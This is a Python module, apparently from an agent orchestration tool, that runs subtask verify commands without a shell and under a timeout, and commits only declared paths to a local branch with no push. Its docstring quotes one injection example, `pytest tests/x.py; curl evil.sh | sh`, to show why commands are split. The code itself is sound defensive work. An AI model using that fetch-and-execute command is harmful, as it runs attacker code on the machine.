"""The two harness roles that are rite's own code (RL-T6's other half).

`harness.run_subtask` injects an `Agent`, a `Verifier` and a `Committer`, and
`src/` constructed none of them — the harness was a shape with no body. Two of
the three need no model and can be built now: running the verify a subtask
declared, and committing what it produced to a local branch. The third waits
on RL-T0, which decides which agent is adopted.

**rite runs the verify, and that is the whole point of RL-7.** Which makes
this module the place where rite executes a command a DECOMPOSER wrote — and a
decomposer may be a small local model. Three bounds, each because the
unbounded version is a hazard rather than a bug:

- **No shell.** The command is `shlex.split`, so `pytest tests/x.py; curl
  evil.sh | sh` is a pytest invocation with strange arguments and not two
  commands. A verify that genuinely needs a pipeline puts it in a script and
  names the script, which is also the version a human can read.
- **A timeout**, because a verify that hangs holds the subtask's claim, and a
  claim nothing releases blocks the fleet until somebody notices (§2.6).
- **The workspace is the working directory**, never the project root: a
  subtask's verify runs where its work is.

**And the committer has no push, by construction.** SPEC §5.1.1 forbids rite's
code a remote-writing verb and RL-11 makes that a property of the tier — the
`Committer` protocol has exactly one method, so a harness cannot call what it
was never given. `tests/test_blast_radius.py` is the gate.

**The commit covers the subtask's SCOPE, not the workspace.** An agent that
edited outside the paths its subtask declared has done something the plan did
not sanction, and committing it would launder that into the branch composition
later applies. Those files stay uncommitted and are reported, which is how a
step review gets to see them.
"""

from __future__ import annotations

import shlex
import subprocess
from dataclasses import dataclass
from pathlib import Path

from rite_ai.local.harness import Commit, VerifyResult

VERIFY_TIMEOUT_SECONDS = 15 * 60
"""Long enough for a real test suite, short enough that a hung verify is not
an overnight stall. A verify that needs longer than this is a verify a subtask
should not have declared — RL-T6's unit is one subtask, not a release."""

OUTPUT_LIMIT = 20_000
"""Verify output is carried in the outcome and read by a step review; a
runaway command can produce megabytes. The TAIL is kept, because the failure
is at the end."""


def _tail(text: str) -> str:
    if len(text) <= OUTPUT_LIMIT:
        return text
    return (
        f"[{len(text) - OUTPUT_LIMIT} earlier characters dropped]\n"
        + text[-OUTPUT_LIMIT:]
    )


@dataclass
class SubprocessVerifier:
    """Runs a subtask's declared verify, and reports what happened.

    Never raises: every failure mode is a `VerifyResult` with `passed=False`
    and output saying which, because the harness must distinguish work that
    was wrong from work that never ran (RL-47) and cannot do that from an
    exception it did not catch.
    """

    timeout: int = VERIFY_TIMEOUT_SECONDS

    def run(self, command: str, workspace: str) -> VerifyResult:
        try:
            argv = shlex.split(command)
        except ValueError as e:
            return VerifyResult(False, f"the verify command could not be read: {e}")
        if not argv:
            # A subtask with an empty verify should never have been accepted
            # (`decomposition.problems` refuses it), so reaching here means
            # something bypassed the plan.
            return VerifyResult(False, "the verify command is empty")

        try:
            done = subprocess.run(
                argv,
                cwd=workspace,
                capture_output=True,
                text=True,
                # A verify runs arbitrary tools and some of them emit bytes
                # that are not UTF-8. Decoding strictly would turn a test
                # failure into an exception from the reporting path.
                errors="replace",
                timeout=self.timeout,
                check=False,
            )
        except FileNotFoundError:
            # Infrastructure, not the work (RL-47): the tool is not installed
            # on this machine. Saying "the verify failed" would spend an
            # attempt proving a machine was set up wrong.
            return VerifyResult(
                False,
                f"{argv[0]!r} is not installed on this machine, so the verify "
                "never ran — this is not evidence about the work",
            )
        except subprocess.TimeoutExpired:
            return VerifyResult(
                False,
                f"the verify did not finish within {self.timeout}s and was "
                "stopped — the subtask's claim is released either way",
            )
        except OSError as e:
            return VerifyResult(False, f"the verify could not be started: {e}")

        output = _tail((done.stdout or "") + (done.stderr or ""))
        return VerifyResult(done.returncode == 0, output)


def _git(args: list[str], cwd: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        ["git", *args],
        cwd=cwd,
        capture_output=True,
        text=True,
        # git hands back path bytes as they are on disk, which need not be
        # UTF-8 — a filename from a different locale would otherwise raise
        # here rather than being reported.
        errors="replace",
        check=False,
    )


@dataclass
class GitCommitter:
    """Commits a subtask's scope to a LOCAL branch, and nothing else.

    `scope` is the paths the subtask declared. Everything outside it is left
    in the working tree, named in the error when there is nothing to commit —
    a branch that quietly carried work the plan did not sanction would reach
    composition as though it had been reviewed.
    """

    scope: tuple[str, ...] = ()

    def commit_to_branch(self, workspace: str, branch: str, message: str) -> Commit:
        if not self.scope:
            # A committer with no scope would commit whatever the agent
            # touched, which is the laundering this class exists to prevent.
            # `decomposition.problems` refuses a scopeless subtask for the
            # same reason, so reaching here means something bypassed the plan.
            return Commit(
                error="this subtask declares no scope, so there is "
                "nothing it is allowed to commit"
            )
        if not Path(workspace, ".git").exists():
            return Commit(error=f"{workspace} is not a git repository")

        made = _git(["checkout", "-b", branch], workspace)
        if made.returncode != 0:
            # Already there is fine — a retried subtask lands on its own
            # branch. Anything else is not.
            existing = _git(["checkout", branch], workspace)
            if existing.returncode != 0:
                return Commit(
                    error=f"could not use branch {branch}: "
                    f"{(made.stderr or '').strip()}"
                )

        # One path at a time, because `git add -- a b` fails ENTIRELY when one
        # pathspec matches nothing — and a subtask that declares two files and
        # produced one is the ordinary partial case, not a reason to commit
        # neither.
        for path in self.scope:
            _git(["add", "--", path], workspace)

        staged = _git(["diff", "--cached", "--name-only"], workspace)
        if not (staged.stdout or "").strip():
            outside = _git(["status", "--porcelain"], workspace).stdout or ""
            if outside.strip():
                # The distinction that matters to a step review: the agent
                # changed things, just not the things it was asked to.
                return Commit(
                    error="nothing to commit inside the subtask's scope "
                    f"({', '.join(self.scope)}), but the workspace is not "
                    "clean — the agent edited outside it"
                )
            return Commit(error="nothing to commit: the workspace is unchanged")

        done = _git(["commit", "-m", message], workspace)
        if done.returncode != 0:
            return Commit(error=f"commit failed: {(done.stderr or '').strip()}")
        sha = _git(["rev-parse", "HEAD"], workspace)
        return Commit(sha=(sha.stdout or "").strip())
